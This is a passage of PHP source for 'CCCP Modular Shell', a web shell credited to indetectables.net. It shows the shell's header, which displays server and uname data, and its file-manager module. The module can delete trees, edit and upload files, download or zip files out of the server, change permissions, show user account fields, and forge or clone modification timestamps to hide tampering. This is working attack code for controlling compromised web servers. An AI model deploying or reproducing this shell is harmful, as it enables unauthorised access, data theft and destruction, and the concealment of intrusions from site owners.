		.jpg{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXETCgDAwMCAgID///+AgAD/AAAA/wCvPqjdAAAAAXRSTlMAQObYZgAAAF9JREFUeAE1yMENAiAMRuGOwG+I3Em4G2QBavVenICLK7C+bY3v9OXR3SNriAjf/njQDkxcDc/WlD+JBgP62mSnHLVhp5w3kh/UfomTAY6TRQO81g8TQEAsR6+eAVGiL7noFeTJktBqAAAAAElFTkSuQmCC") no-repeat;}
		.js{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAElBMVEX////AwMCAgIAAAAD//wCAgAA6+FsGAAAAWklEQVR4XlWLyw3AIAxDA2oHQFkgfAZAZAGqTsAh+69SYk716Vl+pnJSSWizEG+IczJAbI2+IdLkDLhN1ScocJqt/n+VagFyGP1xkLddmGKq6ciq6vecEPaOfCLwDtcqFA/EAAAAAElFTkSuQmCC") no-repeat;}
		.lnk{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXFmzzYmnRNLuigJZAUAAgCI71YEPgJXrsCKAAAAAXRSTlMAQObYZgAAAGRJREFUeF4lzLEKgDAMRdEMFedQ7W6LOItgZ8HuRQjuKv5B/9+8mulwE0K0YxIReR9mThlYuBMAQbBa2CKQBh4rmPVGMVh2V0Xc3hsI5fgxyekeoEi79oBk4wrQkIl4qDQ1oCF8s2QTzGgZmRgAAAAASUVORK5CYII=") no-repeat;}
		.log{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXHAwMAAAAD///+AgIAAALWAgAD//wD7+LBgAAAAAXRSTlMAQObYZgAAAFxJREFUeF41jMsJgEAMRIcFC/DiOYxsAf5yly1BbECELcD+wWSN7/SYgQeIAyCtxmxSRkc6lMWY5AzJB/beyVssjEuZv6tebIs+tzSpSvg1kAJfaEH8ZUTQJNEBXtl7FF5T+NYtAAAAAElFTkSuQmCC") no-repeat;}
		.mp3{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAFVBMVEVMaXH////AwMCAgIAAAACAgAD//wAFULzlAAAAAXRSTlMAQObYZgAAAGdJREFUeAE1ykEKAjEUA9AgzgFC5wKjg2tj1X2hPcAH7Qm8/xlMi2aTR/4HkJ2rGyJ5/mMb0yOTtQJLtCB34J2KkrHEZ5OMuKxuoz/Xoqwdx+bTfL73Ig0c2iuS4amSE+IPt5MzUGe+vOoRl1gyM5QAAAAASUVORK5CYII=") no-repeat;}
		.php{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEXt7u20pbN1PXqqna3h3+CiY5iji5/Cn72aaulJAAAAB3RSTlP+C/jy9vd9m8nrNgAAAGNJREFUeF41zMEJwCAMheF36AK5dAChOIDiuZRMIATP0tIBKpL1m4r9L/kg8EAXM1ciEKz0I9SJliYWnoCdVUc3RLpIEUH2sRU9NjivUfVxhhx8d4YZ1jCqIN6/RTKMDGewEr0JfRdojfORagAAAABJRU5ErkJggg==") no-repeat;}
		.pl{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAFVBMVEVLS/WWlrdzc7O7u/L39/0vLzB1dXfIyLy8AAAAbUlEQVR4XkXLQQ4CIQyF4RfxAjWVteIFUAxryfQEmrKfCHP/I0jJJP6rL3l5oD2wSH6KFHC694+Bat+qwa+lKtvkt6xNHmDRs7ZSccHsgFuMA24ARwdnWF7JJQMQsWNO/xcvun69vkEUAp3C9QcQsBJpjnPQBwAAAABJRU5ErkJggg==") no-repeat;}
		.py{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAASBAMAAACgFUNZAAAAFVBMVEXU1dBJSUmIiIhMaXH39/ZJf6z12mal68qMAAAABHRSTlPwbJkA1LtzKgAAAGFJREFUeF49yrsNhEAMRdGHZBMjoAFowQ04sIg38cYTTf8l8MwIbnT8wXo+HdhFgjl2BwbCM6UgqvkruOaAJtGIZP/+AYW59wJHVs8vnJcGIq7CRDjhGxHOhRXIzbCATWY3y8IfVW0lgwUAAAAASUVORK5CYII=") no-repeat;}
		.rename{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAHlBMVEXP2unl6/NogqS8x9Y/R1L5+/2GlKecqLgrMTpabYUCMXjvAAAACXRSTlP99gP+rv7d/ScbTgzOAAAAdElEQVR4AWNQUmY2NmZrUgIyBBgYRDOgDNYQKINBpAnKCAExBIEAxGiHSiUXGwOBeQlDomBooGhoYAhD4vTk9OLUMBGGxInlCQHTw1gYEmeWTisvL2MBShVODE7MZGFImFg8LT1RTASoS1CAEWgiQ4sLBAAAQBEfQdjw2gUAAAAASUVORK5CYII=") no-repeat;}
		.swf{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAUBAMAAAB/pwA+AAAAGFBMVEVMaXEAAAD/////RBylAAD8z5/njpP/tgDJs8ZAAAAAAXRSTlMAQObYZgAAAGpJREFUeAFjwAEYBcEAzFQCAUUoM1zJSCkAwlQPMgo2ADGBrFJTU4gC1fJ04wCoWrUiVWNjCDPFSdkYIqriFuIC1aYSlJLsZAxV66LmxgxiKgqpuCmZQNQKhiQpqYCZimIgR6A4B+FIHAAAPKISiDRgUyIAAAAASUVORK5CYII=") no-repeat;}
		.tar{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXE7QAUXAAAAUW/l6ey8lKGJBVFVz9lgkT8gAAAAAXRSTlMAQObYZgAAAFJJREFUeAFjEIQAAYbQ0MQ0IEhicHFJcQkNDQ0CMlJhIoJKIMCgBAEKQMXGYACUMnEvLy8vBjJMYSKCYAayYogdQCkRkOJCIEMUpMQQpBgM4IoBaBkbvmcdFLkAAAAASUVORK5CYII=") no-repeat;}
		.txt{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABMAAAAQBAMAAAAG6llRAAAAD1BMVEVMaXH///8AAADHx8eFhYXIFtsVAAAAAXRSTlMAQObYZgAAADVJREFUeAFjYGACAwYQUHQEAQUgi0UIAkBMQTAwQmcqKSopYRFVolQUwTQGAxCTQQkMgC4DAOb7DCz7id5MAAAAAElFTkSuQmCC") no-repeat;}
		.unk{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXGFptrR5PxfaHnx9/60zPMlTqR1iLk29K4nAAAAAXRSTlMAQObYZgAAAFtJREFUeAFjYBAEAgEGIBBxcXERNIAxxMEM1yClcAMgwzUtLUkVxHBLD08DM8KSlCAMJyVFMENISaksFcwACgSFAhlFSmqJqhCGqmgoTASVUQiyvhzIYDYGAQMAJZwXv2puTlMAAAAASUVORK5CYII=") no-repeat;}
		.xml{background:url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABAAAAAQBAMAAADt3eJSAAAAGFBMVEVMaXH6+vqGhoYAAAAsap6Kyu8AAJYzmQAtPsCtAAAAAXRSTlMAQObYZgAAAE9JREFUeAFjUAIDBgYGRUEgEFWAMYSgDGFjAwZFUUEXR1FBICNMRDRMLNCAQTVRJLRMMBUsEp4GFAGpSUsEqxEEARBDxAUI8IogGMYQYAAA5l8SSFIGd4wAAAAASUVORK5CYII=") no-repeat;}
	  

		div.paginator {
			text-align:center;
			padding: 7px;
			margin: 3px;
		}
		
		div.paginator a {
			padding: 2px 5px 2px 5px; 
			margin: 2px;
			border: 1px solid #000;
			text-decoration: none;
		}
		
		div.paginator a:hover, div.paginator a:active {
			border: 1px solid #000;
			background-color:#000;
			color: #fff;
		}

		div.paginator span.current {
			padding: 2px 5px 2px 5px;
			margin: 2px; 
			border: 1px solid #000;
			font-weight: bold;
			background-color: #000;
			color: #fff;
		}
		  
		div.paginator span.disabled {
			padding: 2px 5px 2px 5px;
			margin: 2px;
			border: 1px solid #eee; 
			color: #ddd; 
		}
	  </style>
	</head>
	<body>
	  <center>
		<table style="border-collapse: collapse" height="1" cellspacing="0" cellpadding="5" width="100%" bgcolor="#333333" border="1" bordercolor="#C0C0C0">
		  <tr>
			<th width="100%" height="15" nowrap="nowrap" bordercolor="#C0C0C0" valign="top" colspan="2">
			  <p><font face="Verdana" size="5"><b>CCCP Modular Shell</b></font></p>
			</th>
		  </tr>
		  <tr>
			<td>
			  <p align="left"><b>Software: ' . $_SERVER['SERVER_SOFTWARE'] . '</b></p>
			  <p align="left"><b>uname -a: ' . php_uname() . '</b></p>
			  <p align="left"><b>Safe-mode: ' . getcfg('safe_mode') . '</b></p>
			  <br><center>' . $sysMenu . '</center>
			</td>
		  </tr>
		  <tr>
			<td id="content" width="100%"></td>
		  </tr>
		</table>

	  --[ <a href="http://indetectables.net" target="_blank">CCCP Modular Shell v1.0 by DSR!</a> <b>|</b> Generation time: <span id="uetime">0.00</span> ]--
	  </center>
	</body>
	</html>
	';
	
	sAjax($loader);
}

if (isset($p['me']) && $p['me'] === 'file'){
	$shelldir = getPath(SROOT, '.');

	function dirsize($dir){
        $f = $s = 0;
        $dh = @opendir($dir);
        while ($file = @readdir($dh)){
			if ($file !== '.' && $file !== '..'){
				$path = $dir . DS . $file;
				if (@is_dir($path)){
					$tmp = dirsize($path); 
					$f = $f + $tmp['f'];  
					$s = $s + $tmp['s'];  
				} else {
					$f++;
					$s += @filesize($path);
				}
			}
        }
        @closedir($dh);
        return array ('f' => $f, 's' => $s);
    }

    function getChmod($filepath){
        return substr(base_convert(@fileperms($filepath), 10, 8), -4);
    }

    function getPerms($filepath){ # C99r16
		$mode = @fileperms($filepath);
        if (($mode & 0xC000) === 0xC000) $type = 's';     // Socket
        else if (($mode & 0x4000) === 0x4000) $type = 'd'; // Directory
        else if (($mode & 0xA000) === 0xA000) $type = 'l'; // Symbolic Link
        else if (($mode & 0x8000) === 0x8000) $type = '-'; // Regular 
        else if (($mode & 0x6000) === 0x6000) $type = 'b'; // Block special
		else if (($mode & 0x2000) === 0x2000) $type = 'c'; // Character special
		else if (($mode & 0x1000) === 0x1000) $type = 'pa';// FIFO pipe
		else $type = '?';                                 // Unknown

		$owner['read'] = ($mode & 00400) ?    'r' : '-'; 
		$owner['write'] = ($mode & 00200) ?   'w' : '-'; 
		$owner['execute'] = ($mode & 00100) ? 'x' : '-'; 
		$group['read'] = ($mode & 00040) ?    'r' : '-'; 
		$group['write'] = ($mode & 00020) ?   'w' : '-'; 
		$group['execute'] = ($mode & 00010) ? 'x' : '-'; 
		$world['read'] = ($mode & 00004) ?    'r' : '-'; 
		$world['write'] = ($mode & 00002) ?   'w' : '-'; 
		$world['execute'] = ($mode & 00001) ? 'x' : '-'; 

		if ($mode & 0x800){$owner['execute'] = ($owner['execute']==='x') ? 's' : 'S';}
		if ($mode & 0x400){$group['execute'] = ($group['execute']==='x') ? 's' : 'S';}
		if ($mode & 0x200){$world['execute'] = ($world['execute']==='x') ? 't' : 'T';}
		
		return $type.$owner['read'].$owner['write'].$owner['execute'].$group['read'].$group['write'].$group['execute'].$world['read'].$world['write'].$world['execute'];
    }

    function getUser($filepath){
		if (function_exists('posix_getpwuid')){
			$array = @posix_getpwuid(@fileowner($filepath));
			if ($array && is_array($array))
				return ' / ' . mLink($array['name'], 'return false;', "title='User: {$array['name']} Passwd: {$array['passwd']} " .
					"UID: {$array['uid']}	GID: {$array['gid']} Gecos: {$array['gecos']} Dir: {$array['dir']} " .
					"Shell: {$array['shell']}'", false);
		}
		return '';
    }
	
	function vPermsColor($t){ 
		$c = 'mg';
		if (!is_readable($t))
			$c = 'mr';
		else if (!is_writable($t))
			$c = 'mw';
		return "<font class='$c'>" . getChmod($t) . '&nbsp;' . getPerms($t) . "</font>";
	}

    function delTree($path){
		$origipath = $path;
		$h = opendir($path);
		while (true){
		    $item = readdir($h);
		    if ($item === '.' or $item === '..')
		        continue;
		    else if (gettype($item) === 'boolean'){
		        closedir($h);
		        if (!@rmdir($path))
					return false;
		        
		        if ($path == $origipath) 
					break;
		        
		        $path = substr($path, 0, strrpos($path, DS));
		        $h = opendir($path);
		    } else if (is_dir($path . DS . $item)){
		        closedir($h);
		        $path = $path . DS . $item;
		        $h = opendir($path);
		    } else 
		        unlink($path . DS . $item);
		}
		return true;
    }
		
    function recursiveCopy($path, $dest){ 
		if (is_dir($path)){
			@mkdir($dest);
			$objects = scandir($path);
			if (sizeof($objects) > 0){
				foreach($objects as $file){
					if ($file !== '.' && $file !== '..'){
						if (is_dir($path.$file))
							recursiveCopy($path . $file . DS, $dest . DS . $file . DS);
						else 
							copy($path . $file, $dest . $file);
					}
				}
			}
			return true;
		} else if(is_file($path)){
			return copy($path, $dest);
		} else {
			return false;
		} 
    }
	
	function getext($file){
		//$info = pathinfo($file);
		return pathinfo($file, PATHINFO_EXTENSION);
    }
	
	function checkFile($t, $w, $f){
		$ret = true;
		if ($w)
			$ret = $ret && is_writable($t);
			
		/*if ($f){
			if ($re)
				$ret = $ret && (preg_match('@' . $sBuff . '@', $file) || preg_match('@' . $sBuff . '@', @file_get_contents($f)))
			else 
				$ret = $ret && (strstr($file, $sBuff) || strstr(@file_get_contents($f), $sBuff))
		}
			
		if ($extFilter)
			$ret = $ret && (in_array(getext($f), explode(',', $extFilter)));
		*/
			
		return $ret;
	}
		
	function fileList($typ, $dir, $limit, $page, $onlyW = false, $find = false, $rec = false, $count = 0){
		global $dData;
		$sFolder = $sFile = $show = true;
		if ($limit){
			$show = false;
			if (!isset($page))
				$page = 1;
			
			$start = $limit * ($page - 1);
			$limit = $limit * $page;
		}
		
		if ($typ === 'dir')
			$sFile = false;
		else if ($typ === 'file')
			$sFolder = false;
			
		if ($res = opendir($dir)){
			while ($file = readdir($res)){
				if ($limit)	{
					if ($count == $start) 
						$show = true;
						
					if ($count == $limit) 
						break;  
				}

				if ($file !== '.' && $file !== '..' && is_dir($dir . $file)){						
					if ($rec)
						//yield fileList($typ, $dir . $file, $limit, $page, $find, $rec, $count);
						fileList($typ, $dir . $file, $limit, $page, $find, $rec, $count);
					else if ($show && $sFolder && checkFile($dir . $file, $onlyW, $find))
						//yield array('t'=>'d', 'n'=>$file);
						$dData[$count] = array('t'=>'d', 'n'=>$file);
						
					$count++;
				} else if (is_file($dir . $file) && $sFile){
					if ($show && checkFile($dir . $file, $onlyW, $find))
						//yield array('t'=>'f', 'n'=>$file);
						$dData[$count] = array('t'=>'f', 'n'=>$file);
						
					$count++;
				} //TODO syslinks 
			}
			
			closedir($res);
			@clearstatcache();
			return $dData;
		} else
			return array();
	}

    if (@$p['md'] === 'vs'){
		$s = dirsize($p['f']);
		sAjax(is_numeric($s['s']) ? sizecount($s['s']) . ' (' . $s['f'] . ')' : 'Error?');
	} else if (@$p['md'] === 'tools'){
		switch ($p['ac']){
			case 'cdir':
				if (file_exists($p['a'] . $p['b']))
					sAjax(tText('alredyexists', 'object alredy exists'));
				else {
					sAjax(@mkdir($p['a'] . $p['b'], 0777) ? 'OK' : tText('fail', 'Fail!'));
					@chmod($p['a'] . $p['b'], 0777);
				}
				break;
			case 'cfile':
				if (file_exists($p['a'] . $p['b']))
					sAjax(tText('alredyexists', 'object alredy exists'));
				else {
					$fp = @fopen($p['a'] . $p['b'], 'w');
					if ($fp){
						@fclose($fp);
						sAjax('OK');
					} else sAjax(tText('accessdenied', 'Access denied'));
				}
				break;
			case 'comp':
				if ($p['dl']){
					$zip = new PHPZip();
					$zip->Zipper($p['fl'], $p['dl']);
					header('Content-Type: application/octet-stream');
					header('Accept-Ranges: bytes');
					header('Accept-Length: ' . strlen($compress));
					header('Content-Disposition: attachment;filename=' . $_SERVER['HTTP_HOST'] . '_' . date('Ymd-His') . '.zip');
					echo $zip->file();
					exit;
				}
				break;
			case 'copy': 
				if ($p['dl']){
					$fNames = Array();
					$total = count($p['dl']);
					if ($p['b'][(strlen($p['b']) - 1)] !== DS) $p['b'] .= DS; 
					for ($z = 0; $total > $z; $z++){
						$fileinfo = pathinfo($p['fl'] . $p['dl'][$z]);
						if (!file_exists($p['fl'] . $p['dl'][$z]))
							sAjax(tText('notexist', 'Object does not exist'));
						else {
							if (is_dir($p['fl'] . $p['dl'][$z])){ 
								if (!@recursiveCopy($p['fl'] . $p['dl'][$z], $p['b'] . $fileinfo['basename'] . DS)) $fNames[] = $p['dl'][$z];
							} else {
								if (!@copy($p['fl'] . $p['dl'][$z], $p['b'] . $fileinfo['basename'])) $fNames[] = $p['dl'][$z];
							}
						}
					}
					sAjax(hsc(tText('total', 'Total') . ': ' . $total . ' [' . tText('correct', 'correct') . ' ' . ($total - count($fNames)) . ' - ' . tText('failed', 'failed') . ' '. count($fNames) . (count($fNames) == 0 ? '' : ' (' . implode(', ', $fNames) . ')') . ']'));
				}
				break;
			case 'del':
				if (!file_exists($p['a']))
					sAjax(tText('notexist', 'Object does not exist'));
				else
					sAjax((is_dir($p['a']) ? @delTree($p['a']) : @unlink($p['a'])) ? 'OK' : tText('fail', 'Fail!'));				
				break;
			case 'rdel':
				if ($p['dl']){
					$fNames = Array();
					$total = count($p['dl']);				
					for ($z = 0; $total > $z; $z++){
						if (is_dir($p['fl'] . $p['dl'][$z])){
							if (!@delTree($p['fl'] . $p['dl'][$z])) $fNames[] = $p['dl'][$z];
						} else {
							if (!@unlink($p['fl'] . $p['dl'][$z])) $fNames[] = $p['dl'][$z];
						}
					}
					sAjax(tText('total', 'Total') . ': ' . $total . ' [' . tText('correct', 'correct') . ' ' . ($total - count($fNames)) . ' - ' . tText('failed', 'failed') . ' '. count($fNames) . (count($fNames) == 0 ? '' : ' (' . implode(', ', $fNames) . ')') . ']');
				}
				break;
			case 'dl':
				if (!file_exists($p['fl']))
					sAjax(tText('notexist', 'Object does not exist'));
				else {
					$fileinfo = pathinfo($p['fl']);
					header('Content-Type: application/x-' . $fileinfo['extension']);
					header('Content-Disposition: attachment; filename=' . $fileinfo['basename']);
					header('Content-Length: ' . filesize($p['fl']));
					@readfile($p['fl']);
					exit;
				}
				break;
			case 'edit':
				$fp = @fopen($p['a'], 'w');
				sAjax((@fwrite($fp, $p['fc']) ? tText('ok', 'Ok!') : tText('fail', 'Fail!')));
				@fclose($fp);
				break;
			case 'mdate':
				if (!@file_exists($p['a']))
					sAjax(tText('notexist', 'Object does not exist'));
				else {
					if (isset($p['b'])) $time = strtotime($p['b']);
					else $time = strtotime($p['y'] . '-' . $p['m'] . '-' . $p['d'] . ' ' . $p['h'] . ':' . $p['i'] . ':' . $p['s']);
					sAjax(@touch($p['a'], $time, $time) ? tText('ok', 'Ok!') : tText('fail', 'Fail!'));
				}
				break;
			case 'mdatec':
				if (!@file_exists($p['a']) || !@file_exists($p['b'])) 
					sAjax(tText('notexist', 'Object does not exist'));
				else {
					$time = @filemtime($p['b']);
					sAjax(@touch($p['a'], $time, $time) ? tText('ok', 'Ok!') : tText('fail', 'Fail!'));
				}
				break;				
			case 'mpers':
				if (!file_exists($p['a']))
					sAjax(tText('notexist', 'Object does not exist'));
				else
					sAjax(@chmod($p['a'], base_convert($p['b'], 8, 10)) ? 'OK' : tText('fail', 'Fail!'));
				break;	
			case 'ren':
				if (!file_exists($p['a']))
					sAjax(tText('notexist', 'Object does not exist'));
				else
					sAjax(@rename($p['a'], $p['b']) ? 'OK' : tText('fail', 'Fail!'));
				break;
		}
	} else if (@$p['md'] === 'info'){
		if (file_exists($p['t'])){
			$sBuff .= '<h2>' . tText('information', 'Information') . ' [' . mLink(tText('goback', 'Go Back'), 'ajaxLoad("me=file&dir=' . rawurlencode(getUpPath($p['t'])) . '")') . ']</h2>
					 <table border=0 cellspacing=1 cellpadding=2>
					 <tr><td><b>' . tText('path', 'Path') . '</b></td><td>' . hsc($p['t']) . '</td></tr>
					 <tr><td><b>' . tText('size', 'Size') . '</b></td><td>' . sizecount(filesize($p['t'])) . '</td></tr>
					 <tr><td><b>' . tText('md5', 'MD5') . '</b></td><td>' . strtoupper(@md5_file($p['t'])) . '</td></tr>
					 <tr><td><b>' . tText('sha1', 'SHA1') . '</b></td><td>' . strtoupper(@sha1_file($p['t'])) . '</td></tr>
					 <tr><td><b>' . tText('ctime', 'Create time') . '</b></td><td>' . date($config['datetime'], filectime($p['t'])) . '</td></tr>
					 <tr><td><b>' . tText('atime', 'Access time') . '</b></td><td>' . date($config['datetime'], fileatime($p['t'])) . '</td></tr>
					 <tr><td><b>' . tText('mtime', 'Modify time') . '</b></td><td>' . date($config['datetime'], filemtime($p['t'])) . '</td></tr>';
						 
			if (!$isWIN){
				$ow = posix_getpwuid(fileowner($p['t']));
				$gr = posix_getgrgid(filegroup($p['t']));
				$sBuff .= '<tr><td><b>' . tText('chmodchown', 'Chmod/Chown') . '</b></td><td>' .
							($ow['name'] ? $ow['name'] : fileowner($p['t'])) . '/' . ($gr['name'] ? $gr['name'] : filegroup($p['t'])) .
							'<tr><td><b>' . tText('perms', 'Perms') . '</b></td><td>' . vPermsColor($p['t']) . '</td></tr>';
			}
			$sBuff .= '</table><br>';
					
			$fp  = @fopen($p['t'], 'rb');
			if ($fp){
				$sBuff .= '<div data-path="' . $p['t'] . '"><p>
								[' . mLink(tText('hl', 'Highlight'), 'ajaxLoad("me=file&md=info&hl=n&t=" + euc(dpath(this, false)))') . ']
								[' . mLink(tText('hlp', 'Highlight +'), 'ajaxLoad("me=file&md=info&hl=p&t=" + euc(dpath(this, false)))') . ']
								[' . mLink(tText('hd', 'Hexdump'), 'ajaxLoad("me=file&md=info&hd=n&t=" + euc(dpath(this, false)))') . ']
								[' . mLink(tText('hdp', 'Hexdump preview'), 'ajaxLoad("me=file&md=info&hd=p&t=" + euc(dpath(this, false)))') . ']
								[' . mLink(tText('edit', 'Edit'), 'ajaxLoad("me=file&md=edit&t=" + euc(dpath(this, false)))') . ']
							</p></div><br><br>';		
				
				if (isset($p['hd'])){
					if ($p['hd'] === 'n'){
						$sBuff .= '<b>Hex Dump</b><br>';
						$str = fread($fp, filesize($p['t']));
					} else {
						$sBuff .= '<b>Hex Dump Preview</b><br>';
						$str = fread($fp, $config['hd_lines'] * $config['hd_rows']);
					}
					
					$show_offset  = '00000000<br>';
					$show_hex     = '';
					$show_sBuff = '';
					$counter      = 0;
					$str_len      = strlen($str);
					for ($i = 0; $i < $str_len; $i++){
						$counter++;
						$show_hex .= sprintf('%02X', ord($str[$i])) . ' ';
						switch (ord($str[$i])){
							case 0 :
							case 9 :
							case 10:
							case 13:
							case 32: $show_sBuff .= ' '; 
								break;
							default: $show_sBuff .= $str[$i];
						}
						if ($counter === $config['hd_rows']){
							$counter = 0;
							if ($i + 1 < $str_len) 
								$show_offset .= sprintf('%08X', $i + 1) . '<br>';
							$show_hex .= '<br>';
							$show_sBuff .= "\n";
						}
					}
					$sBuff .= '<center><table border=0 bgcolor=#666666 cellspacing=1 cellpadding=5><tr><td bgcolor=#666666><pre>' . $show_offset . '</pre></td><td bgcolor=000000><pre>' . $show_hex . '</pre></td><td bgcolor=000000><pre>' . hsc($show_sBuff) . '</pre></td></tr></table></center><br>';
				} else if (isset($p['hl'])){
					if (function_exists('highlight_file')){
						if ($p['hl'] === 'n'){
							$sBuff .= '<b>Highlight:</b><br>' .
										'<div class=ml1 style="background-color: #e1e1e1; color:black;">' . highlight_file($p['t'], true) . '</div>'; 
						} else {
							$code = substr(highlight_file($p['t'], true), 36, -15);
							//if (substr_count($code, '<br>') > substr_count($code, "\n"))
							$lines = explode('<br />', $code);
							$pl = strlen(count($lines));
							$sBuff .= '<b>Highlight +:</b><br><div class=ml1 style="background-color: #e1e1e1; color:black;">';
							
							foreach($lines as $i => $line){
								$sBuff .= sprintf('<span style="color: #999999;font-weight: bold">%s | </span>%s<br>', str_pad($i + 1,  $pl, '0', STR_PAD_LEFT), $line);
							}

							$sBuff .= '</div>';
						}
					} else
						sDialog(tText('hlerror', 'highlight_file() dont exist!'));
				} else {
					$str = @fread($fp, filesize($p['t']));
					$sBuff .= '<b>File:</b><br>' .
								'<textarea class="bigarea" readonly>' . hsc($str) . '</textarea><br><br>';
				}
			}
		} else
			$sBuff .= sDialog(tText('accessdenied', 'Access denied'));
		
		@fclose($fp);
	} else if (@$p['md'] === 'edit'){
		if (file_exists($p['t'])){
			$filemtime = explode('-', @date('Y-m-d-H-i-s', filemtime($p['t'])));
			$sBuff .= '<h2>' . tText('edit', 'Edit') . ' [' . mLink(tText('goback', 'Go Back'), 'ajaxLoad("me=file&dir=' . rawurlencode(getUpPath($p['t'])) . '")') . ']</h2>
					<div class="alt1 stdui"><form name="cldate">
						' . mHide('me', 'file') . mHide('md', 'tools') . mHide('ac', 'mdatec') . '
						<h3>' . tText('e1', 'Clone folder/file last modified time') . '</h3>
						' . mInput('a', $p['t'], tText('e2', 'Alter folder/file'), 1, '', 'style="width: 99%;" disabled') . '
						' . mInput('b', '', tText('e3', 'Reference folder/file (fullpath)'), 1, '', 'style="width: 99%;"') . '
						' . mSubmit(tText('go', 'Go!'), 'uiupdate(0)') . '
					</form></div><br><br>
					<div class="alt1 stdui"><form name="chdate">
						' . mHide('me', 'file') . mHide('md', 'tools') . mHide('ac', 'mdate') . '
						<h3>' . tText('e4', 'Set last modified time') . '</h3>
						' . mInput('a', $p['t'], tText('e5', 'Current folder/file (fullpath)'), 1, '', 'style="width: 99%;" disabled') . '
						<p>
							' . tText('year', 'year') . ': ' . mInput('y', $filemtime[0], '', '', '', 'size="4"') . '
							' . tText('month', 'month') . ': ' . mInput('m', $filemtime[1], '', '', '', 'size="2"') . '
							' . tText('day', 'day') . ': ' . mInput('d', $filemtime[2], '', '', '', 'size="2"') . '
							' . tText('hour', 'hour') . ': ' . mInput('h', $filemtime[3], '', '', '', 'size="2"') . '
							' . tText('minute', 'minute') . ': ' . mInput('i', $filemtime[4], '', '', '', 'size="2"') . '
							' . tText('second', 'second') . ': ' . mInput('s', $filemtime[5], '', '', '', 'size="2"') . '
						</p>
						' . mSubmit(tText('go', 'Go!'), 'uiupdate(1)') . '
					</form></div><br><br>';
					
			$fp = @fopen($p['t'], 'r');
			if ($fp) {
				$sBuff .= '<div class="alt1 stdui"><form data-path="' . $p['t'] . '">
								' . mHide('me', 'file') . mHide('md', 'tools') . mHide('ac', 'edit') . mHide('a', $p['t']) . '
								<h3>' . tText('e5', 'Edit file') . '</h3>
								<p>
									[' . mLink(tText('hl', 'Highlight'), 'ajaxLoad("me=file&md=info&hl=n&t=" + euc(dpath(this, false)))') . ']
									[' . mLink(tText('hlp', 'Highlight +'), 'ajaxLoad("me=file&md=info&hl=p&t=" + euc(dpath(this, false)))') . ']
									[' . mLink(tText('hd', 'Hexdump'), 'ajaxLoad("me=file&md=info&hd=n&t=" + euc(dpath(this, false)))') . ']
									[' . mLink(tText('hdp', 'Hexdump preview'), 'ajaxLoad("me=file&md=info&hd=p&t=" + euc(dpath(this, false)))') . ']
								</p><br>
								<textarea name="fc" cols="100" rows="25" style="width: 99%;">' . hsc(@fread($fp, filesize($p['t']))) . '</textarea>
								' . mSubmit(tText('go', 'Go!'), 'uiupdate(2)') . '
							</form></div><br><br>';
			}
			@fclose($fp);
		}
	} else {
		if (isset($p['ac']) && $p['ac'] === 'up')
			sDialog(@copy($_FILES['upf']['tmp_name'], $p['dir'] . DS . $_FILES['upf']['name']) ? tText('upload', 'Upload') . ' ' . tText('ok', 'Ok!') : tText('fail', 'Fail!'));
				
		$currentdir = $shelldir;
        if (!empty($p['dir'])){
			$p['dir'] = fixRoute($p['dir']);
			if (substr($p['dir'], -1) !== DS) $p['dir'] = $p['dir'] . DS;
			$currentdir = $p['dir'];
		}

        $sBuff .= '<form name="fmg"><table width="100%" border="0" cellpadding="15" cellspacing="0"><tr><td>';

        $free = @disk_free_space($currentdir);
        $all = @disk_total_space($currentdir);
        if ($free) $sBuff .= '<h2>' . tText('freespace', 'Free space') . ' ' . sizecount($free) . ' ' . tText('of', 'of') . ' ' . sizecount($all) . ' (' . round(100 / ($all / $free), 2) . '%)</h2>';
		
		$fp = '';
		$lnks = '';	
		foreach (explode(DS, $currentdir) as $tmp){
			if (!empty($tmp) || empty($fp)){
				$fp .= $tmp . DS;
				$lnks .= mLink($tmp . DS, 'godisk(this)', "data-path='{$fp}'") . ' ';
			}
		}
		unset($fp, $tmp);

		$sBuff .= '<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
			  <tr>
				<td nowrap>' . tText('acdir', 'Current directory') . ' [' . (@is_writable($currentdir) ? tText('writable', 'Writable') : tText('no', 'No') . ' ' . tText('writable', 'Writable')) . ($isWIN ? '' : ', ' . getChmod($currentdir)) . ']: </td>
				<td width="100%"><span id="sgoui" class="hide"><div class="image dir" onclick="change(\'sgoui\', \'lnks\')"></div>&nbsp;
				&nbsp;' . mInput('goui', $currentdir, '', '', '', 'size="100%"') . '
				&nbsp;' . mSubmit(tText('go', 'Go!'), 'godirui()', '', 'style="width: 5px;display: inline;"') . '</span><span id="lnks"><div class="image edit" onclick="change(\'lnks\', \'sgoui\')"></div>&nbsp;'. $lnks .'</span></td>
			  </tr>
			</table>		
			<tr class="alt1"><td colspan="7" style="padding:5px;">';

        if ($isWIN){
			$sBuff .= tText('drive', 'Drive') . ': ';
			if (class_exists('COM')){
				$obj = new COM('scripting.filesystemobject');
				if ($obj && is_object($obj)){
					$DriveTypeDB = array(0 => tText('unknow', 'Unknow'),
						1 => tText('removable', 'Removable'),
						2 => tText('fixed', 'Fixed'),
						3 => tText('network', 'Network'),
						4 => tText('cdrom', 'CDRom'),
